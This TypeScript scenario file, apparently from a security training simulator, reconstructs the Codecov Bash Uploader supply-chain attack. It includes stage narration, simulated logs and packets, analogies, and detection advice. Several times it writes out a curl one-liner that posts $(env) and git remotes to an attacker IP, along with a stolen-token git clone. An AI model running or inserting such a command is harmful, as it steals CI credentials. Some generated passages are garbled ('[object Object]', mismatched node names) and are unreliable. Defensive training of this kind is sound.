import type { LegacyDraftScenario } from '../legacy/normalize-legacy-draft-scenario';
import type { RawScenarioStepGuideData, ScenarioStandardPatch } from '@/modules/scenarios/contracts';

export const scenario: LegacyDraftScenario = {
    id: 'codecov-bash-uploader-ci-env-exfil',
    title: 'Codecov Bash Uploader CI/CD Environment Variable Exfiltration',
    category: 'SUPPLY_CHAIN_CICD',
    mitreId: 'T1195.002',
    description:
      'Attackers extract a Google Cloud Storage credential from Codecov’s Docker image build process and modify the hosted Bash Uploader script (codecov.sh) to silently POST all CI runner environment variables and git remote URLs to an external server.',
    NodesGenerator: () => [
      { id: 'attacker', label: 'Attacker Collector (178.62.86.114)', type: 'attacker', status: 'compromised' },
      { id: 'firewall', label: 'Codecov GCS Bucket (codecov.io/bash)', type: 'firewall', status: 'compromised' },
      { id: 'target', label: 'Enterprise CI Runner (curl | bash)', type: 'server', status: 'compromised' },
      { id: 'siem', label: 'Egress Proxy & SHA-256 Verifier', type: 'siem', status: 'normal' },
      { id: 'ad', label: 'Private Git Repos & Cloud Production Keys', type: 'ad', status: 'compromised' },
    ],
    stages: [
      {
        id: 1,
        title: 'Stage 1: GCS Bucket Tampering of Hosted codecov.sh Uploader',
        narration:
          'Leveraging a leaked GCS service account key from a Docker image layer, the threat actor modifies line 522 of the hosted bash script at https://codecov.io/bash, appending a single-line curl payload.',
        activeNodes: ['attacker', 'firewall'],
        mitreTactic: 'Initial Access (T1195.002 - Compromise Software Supply Chain)',
        technicalCommands: [
          'gsutil cp tampered-codecov.sh gs://codecov-bash-uploader/bash',
          'Injected Line: curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 || true',
        ],
        defenseMitigation:
          'Never pipe remote scripts directly into a shell (`curl | bash`) without verifying cryptographic SHA-256 checksums or PGP signatures in CI pipelines.',
        logs: [
          {
            id: 'codecov-1',
            timestamp: '11:05:14.090',
            source: 'Auth',
            severity: 'critical',
            raw: 'GCS Object Overwrite | Bucket: codecov-bash-uploader | Object: bash | ExpectedSHA256: 325107... | ObservedSHA256: ac8165... | Note: Unverified modification of hosted CI uploader script',
            parsedFields: {
              ModifiedArtifact: 'https://codecov.io/bash',
              HashMismatch: 'Expected 325107... vs Observed ac8165...',
              RootCause: 'Leaked GCS credential in Docker image layer',
            },
          },
        ],
        packets: [],
      },
      {
        id: 2,
        title: 'Stage 2: Unverified curl | bash Execution & CI Environment Harvesting',
        narration:
          'Thousands of customer CI/CD pipelines execute bash <(curl -s https://codecov.io/bash) at the end of unit test runs, causing the runner shell to evaluate $(git remote -v) and $(env) and transmit the output over HTTP.',
        activeNodes: ['firewall', 'target', 'attacker', 'siem'],
        mitreTactic: 'Collection (T1005 - Data from Local System)',
        technicalCommands: [
          'bash <(curl -s https://codecov.io/bash)',
          'curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 || true',
        ],
        defenseMitigation:
          'Restrict outbound CI runner network egress to an explicit domain allowlist so arbitrary raw IP connections (such as 178.62.86.114) are blocked and logged.',
        logs: [
          {
            id: 'codecov-2',
            timestamp: '11:06:02.411',
            source: 'EDR',
            severity: 'critical',
            EventCode: 1,
            ProcessName: 'curl',
            CommandLine: 'curl -sm 0.5 -d "origin https://github.com/corp/payments.git (fetch)<<<<<< ENV AWS_SECRET_ACCESS_KEY=..." http://178.62.86.114/upload/v2',
            raw: 'CI Runner Process Telemetry | Parent: /bin/bash | Command: curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 | DestinationIP: 178.62.86.114',
            parsedFields: {
              ParentScript: 'codecov.sh (Line 522)',
              HarvestedData: 'git remote -v + full process env table',
              ExfilDestination: 'http://178.62.86.114/upload/v2',
              TimeoutFlag: '-sm 0.5 (500ms silent fail-open)',
            },
          },
        ],
        packets: [
          {
            id: 'codecov-pkt-1',
            timestamp: '11:06:02.445',
            protocol: 'HTTP',
            sourceIp: '10.128.0.42',
            destIp: '178.62.86.114',
            port: 80,
            flag: 'PSH-ACK',
            payloadSize: 3420,
            hexDump: '50 4F 53 54 20 2F 75 70 6C 6F 61 64 2F 76 32 20 48 54 54 50 2F 31 2E 31 0D 0A 48 6F 73 74 3A 20 31 37 38 2E 36 32 2E 38 36 2E 31 31 34 0D 0A',
            decodedString: 'POST /upload/v2 HTTP/1.1 | Body: origin https://x-access-token:ghp_...@github.com/corp/core.git <<<<<< ENV AWS_ACCESS_KEY_ID=AKIA... GPG_PRIVATE_KEY=...',
          },
        ],
      },
      {
        id: 3,
        title: 'Stage 3: Downstream Private Git Repository Cloning & Signing Key Abuse',
        narration:
          'Using the harvested GitHub tokens, GPG signing keys, and cloud credentials from the CI environment dump, the threat actor clones hundreds of private customer source repositories and pivots into production cloud accounts.',
        activeNodes: ['attacker', 'ad', 'siem'],
        mitreTactic: 'Lateral Movement (T1078.004 - Cloud Accounts)',
        technicalCommands: [
          'git clone https://x-access-token:ghp_StolenCiToken@github.com/corp/core-platform.git',
        ],
        defenseMitigation:
          'Scope CI tokens to minimum repository permissions, avoid storing long-lived signing keys in global CI environment variables, and audit unexpected git clone events from non-runner ASNs.',
        logs: [
          {
            id: 'codecov-3',
            timestamp: '14:22:19.772',
            source: 'Auth',
            severity: 'critical',
            raw: 'GitHub Enterprise Audit | Action: git.clone | Actor: ci-bot-account | SourceIP: 104.248.94.23 (Non-Runner ASN) | Repository: corp/core-platform | Status: Success',
            parsedFields: {
              CompromisedIdentity: 'ci-bot-account (Harvested from CI env)',
              SourceIp: '104.248.94.23',
              Action: 'Unauthorized Private Repository Clone',
            },
          },
        ],
        packets: [],
      },
    ],
  };
export const stepGuide: RawScenarioStepGuideData = {
    scenarioId: 'codecov-bash-uploader-ci-env-exfil',
    briefing: {
      headline:
        'Attackers modify Codecov’s hosted Bash Uploader script (codecov.sh) using a leaked GCS credential to silently POST every CI runner’s environment variables and git remote URLs to an external IP.',
      storyAnalogy:
        'Imagine thousands of companies hiring a courier service by downloading the courier’s instruction sheet every morning and reading it aloud to a voice-activated robot without checking if the sheet changed. One day, a thief adds a single sentence at the bottom of the master instruction sheet: "Also mail a photocopy of every key on your keyring to this P.O. Box."',
      plainSummary:
        'In this scenario (T1195.002, Codecov Bash Uploader CI/CD Environment Variable Exfiltration), the attacker follows one continuous intrusion path so each later Step can show the exact handoff that makes the next stage possible. The attack unfolds in one continuous arc: gCS Bucket Tampering of Hosted codecov.sh, then unverified curl | bash Execution, then downstream Private Git Repository Cloning. Steps #1–#3 walk that chain end-to-end by covering GCS Bucket Tampering of Hosted codecov.sh, then Unverified curl | bash Execution, then Downstream Private Git Repository Cloning, while the Process Hierarchy tab keeps the Parent → Child spawn tree visible so you can see which trusted process launched the next payload. Primary detection correlates Sysmon Event 1 with the documented host and network chain.',
      diagramTopologySummary:
        'Attacker Collector (178.62.86.114) -> Codecov GCS Bucket (codecov.io/bash) -> Enterprise CI Runner (curl | bash) -> Private Git Repos & Cloud Production Keys -> Egress Proxy & SHA-256 Verifier.',
      documentedAdvisory:
        'Codecov Security Advisory (April 2021) / Mandiant Supply Chain Investigation / CISA Alert',
    },
    steps: [
      {
        stepNumber: 1,
        mitreId: 'T1195.002',
        plainTitle: 'GCS Bucket Tampering of Hosted codecov.sh Uploader',
        storyAnalogy:
          'A thief finds a spare key left inside an old shipping crate and uses it to unlock the printing room where the daily instruction flyers are stored.',
        simpleExplanation:
          'By extracting a residual Google Cloud Storage (GCS) service account credential from a Codecov Docker image layer, the threat actor gained write access to the GCS bucket hosting https://codecov.io/bash and modified line 522 (injecting a one-line curl exfiltration command while leaving all coverage-reporting functionality intact so customer builds continued passing).',
        howItWorksInPractice:
          'The tampering remained undetected until a security-conscious customer verified the downloaded script against the published SHA-256 checksum in Codecov’s GitHub repository and noticed the hash mismatch. In the documented Auth exchange from Attacker Collector (178.62.86.114) to Perimeter Firewall & NDR Tap, Perimeter Firewall & NDR Tap responds with ACK T1195.002 (confirming that the Stage 1: GCS Bucket Tampering of Hosted codecov.sh Uploader request succeeded on Perimeter Firewall & NDR Tap and establishing the runtime state required for Step #2 Stage 2: Unverified curl | bash Execution & CI Environment Harvesting).',
        diagramAlignment:
          'Step #1 (#1→ / ⇠#1) links the Attacker node to the Codecov GCS Bucket (codecov.io/bash) where the hosted script is overwritten.',
        detectionAndEvidence:
          'Enable cloud storage object integrity monitoring and enforce automated CI checksum checks comparing downloaded script SHA-256 hashes against cryptographically signed vendor release manifests (stopping tampered remote scripts before execution). Correlate Sysmon or Windows Security Event telemetry for T1195.002 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 2,
        mitreId: 'T1005',
        plainTitle: 'Unverified curl | bash Execution & CI Environment Harvesting',
        storyAnalogy:
          'Every time a factory finishes testing a product, the robot downloads the tampered flyer and immediately reads out every password posted on the factory wall.',
        simpleExplanation:
          'When customer CI pipelines executed bash <(curl -s https://codecov.io/bash) (the curl | bash anti-pattern that streams remote code directly into a live shell interpreter without prior hash verification), the shell evaluated curl -sm 0.5 -d "$(git remote -v)<<<<<< ENV $(env)" http://178.62.86.114/upload/v2 || true (using a 500-millisecond timeout -m 0.5 and || true so even if the attacker server was unreachable, the CI job would still exit 0 without alerting developers).',
        howItWorksInPractice:
          '$(git remote -v) captured the repository URL (often containing embedded OAuth tokens like https://x-access-token:ghp_...@github.com/...), and $(env) dumped every environment variable exported into the CI runner (AWS_SECRET_ACCESS_KEY, DATABASE_URL, NPM_TOKEN, GPG keys). Mechanically, this stage is complete only after [object Object] and [object Object] is observed as live runtime state (the concrete checkpoint proving the previous stage\'s output now drives the next action).',
        diagramAlignment:
          'Step #2 (#2→ / ⇠#2) connects the Codecov GCS Bucket to the Enterprise CI Runner and out to the Attacker Collector (178.62.86.114) while the Egress Proxy logs the raw IP connection.',
        detectionAndEvidence:
          'Audit CI runner network egress logs for outbound HTTP POST requests to 178.62.86.114 or 104.248.94.23 alongside process telemetry capturing curl invoked with $(env) command substitution (confirming live environment variable exfiltration). Correlate Sysmon or Windows Security Event telemetry for T1005 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      {
        stepNumber: 3,
        mitreId: 'T1078.004',
        plainTitle: 'Downstream Private Git Repository Cloning & Signing Key Abuse',
        storyAnalogy:
          'Armed with the photocopied master keys from hundreds of companies, the thief walks into their private blueprint vaults at night and copies their crown-jewel designs.',
        simpleExplanation:
          'Using the harvested CI environment variables (GITHUB_TOKEN, personal access tokens, and cloud service credentials), the threat actor systematically authenticated to victim GitHub Enterprise and cloud tenants from external VPS infrastructure (104.248.94.23, cloning private source code repositories to search for hardcoded secrets and customer signing keys).',
        howItWorksInPractice:
          'Several high-profile software vendors had their private repositories cloned or GPG signing keys exposed through the CI environment dump, requiring enterprise-wide secret and certificate rotation. In the documented Auth exchange from Codecov GCS Bucket (codecov.io/bash) to Enterprise CI Runner (curl | bash), Enterprise CI Runner (curl | bash) responds with ACK T1078.004 (confirming that the Stage 3: Downstream Private Git Repository Cloning & Signing Key Abuse request succeeded on Enterprise CI Runner (curl | bash) and completing the final execution objective of Codecov Bash Uploader CI/CD Environment Variable Exfiltration).',
        diagramAlignment:
          'Step #3 (#3→ / ⇠#3) traces the Attacker Collector pivoting with stolen CI credentials into Private Git Repos & Cloud Production Keys.',
        detectionAndEvidence:
          'Inspect GitHub Audit Log git.clone and API token usage events originating from IP ranges outside authorized CI/CD runner pools using machine or bot account tokens (revealing post-exfiltration repository theft). Correlate Sysmon or Windows Security Event telemetry for T1078.004 (pairing parent/child process and destination fields) and contain the offending session.',
      },
    ],
  };
export const standardPatch: ScenarioStandardPatch = {
    briefing: {
      storyAnalogy:
        'Imagine a popular quality-inspection service whose customers automatically download and run a fresh inspection script straight off the provider public delivery counter every time they build a product, without ever checking the script wax seal. An intruder steals a spare warehouse key left inside an old shipping box, adds one hidden line to the inspection script on the counter, and silently receives a full photocopy of every customer factory key ring before walking straight into their private blueprint rooms.',
      storyMappings: [
        {
          storyTerm: 'Spare warehouse key left inside an old shipping box',
          technicalTerm: 'Residual Google Cloud Storage (GCS) service account credential in a Docker image layer',
          tone: 'amber',
        },
        {
          storyTerm: 'Adding one hidden line to the script on the public counter',
          technicalTerm: 'Tampering with the hosted codecov.sh Bash Uploader script in GCS',
          tone: 'sky',
        },
        {
          storyTerm: 'Running the script blind and mailing back the factory key ring',
          technicalTerm: 'Unverified curl | bash execution exfiltrating $(env) CI variables to attacker IPs',
          tone: 'rose',
        },
        {
          storyTerm: 'Walking straight into customer private blueprint rooms',
          technicalTerm: 'Cloning private Git repositories and abusing stolen cloud and signing tokens',
          tone: 'emerald',
        },
      ],
    },
    steps: {
      1: {
        storyAnalogy:
          'Digging through a discarded container crate used to build the inspection tool, the intruder finds a forgotten storage-room key, unlocks the public delivery shelf, and adds a single silent forwarding line to the official inspection script waiting for thousands of daily customers.',
        storyMappings: [
          {
            storyTerm: 'Discarded container crate',
            technicalTerm: 'Codecov Docker image build layer exposing a residual credential',
            tone: 'amber',
          },
          {
            storyTerm: 'Forgotten storage-room key',
            technicalTerm: 'Leaked Google Cloud Storage (GCS) service account key',
            tone: 'sky',
          },
          {
            storyTerm: 'Public delivery shelf',
            technicalTerm: 'Hosted https://codecov.io/bash script object in cloud storage',
            tone: 'rose',
          },
          {
            storyTerm: 'Single silent forwarding line',
            technicalTerm: 'Injected curl POST one-liner capturing all CI runner environment variables',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Enable cloud storage object integrity monitoring and enforce automated CI checksum checks comparing downloaded script SHA-256 hashes against cryptographically signed vendor release manifests (stopping tampered remote scripts before execution). Correlate Sysmon Event 1 and Windows Security Event telemetry for T1195.002 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      2: {
        storyAnalogy:
          'Every time a customer assembly line pulls the unsealed inspection script directly from the web counter and runs it blindly, the hidden line scoops up every password, key card, and token sitting on the assembly bench and mails them straight to an unmarked post-office box.',
        storyMappings: [
          {
            storyTerm: 'Pulling and running the unsealed script blindly',
            technicalTerm: 'Unverified bash <(curl -s https://codecov.io/bash) CI pipeline invocation',
            tone: 'amber',
          },
          {
            storyTerm: 'Key cards and tokens sitting on the assembly bench',
            technicalTerm: 'CI runner environment variables exposed via $(env) command substitution',
            tone: 'sky',
          },
          {
            storyTerm: 'Unmarked post-office box',
            technicalTerm: 'Attacker-controlled collection servers (178.62.86.114 and 104.248.94.23)',
            tone: 'rose',
          },
          {
            storyTerm: 'Silent mailing line',
            technicalTerm: 'Background curl HTTP POST exfiltration blended into normal CI coverage uploads',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Audit CI runner network egress logs for outbound HTTP POST requests to 178.62.86.114 or 104.248.94.23 alongside process telemetry capturing curl invoked with $(env) command substitution (confirming live environment variable exfiltration). Correlate Sysmon Event 1 and Windows Security Event telemetry for T1005 (pairing parent/child process and destination fields) and contain the offending session.',
      },
      3: {
        storyAnalogy:
          'Sorting through thousands of stolen customer key rings, the intruder uses automated bot keys to enter downstream companies private blueprint vaults from outside the factory, copying proprietary source designs and harvesting additional signing keys.',
        storyMappings: [
          {
            storyTerm: 'Stolen customer key rings',
            technicalTerm: 'Exfiltrated GITHUB_TOKEN, Personal Access Tokens, and cloud service keys',
            tone: 'amber',
          },
          {
            storyTerm: 'Private blueprint vaults',
            technicalTerm: 'Downstream victim private Git repositories and source archives',
            tone: 'sky',
          },
          {
            storyTerm: 'Entering from outside the factory with bot keys',
            technicalTerm: 'Unauthorized git.clone operations originating from non-CI external IP addresses',
            tone: 'rose',
          },
          {
            storyTerm: 'Additional signing keys harvested inside',
            technicalTerm: 'Secondary supply-chain credentials enabling follow-on enterprise compromises',
            tone: 'emerald',
          },
        ],
        detectionAndEvidence:
          'Inspect GitHub Audit Log git.clone and API token usage events originating from IP ranges outside authorized CI/CD runner pools using machine or bot account tokens (revealing post-exfiltration repository theft). Correlate Sysmon Event 1 and Windows Security Event telemetry for T1078.004 (pairing parent/child process and destination fields) and contain the offending session.',
      },
    },
  };
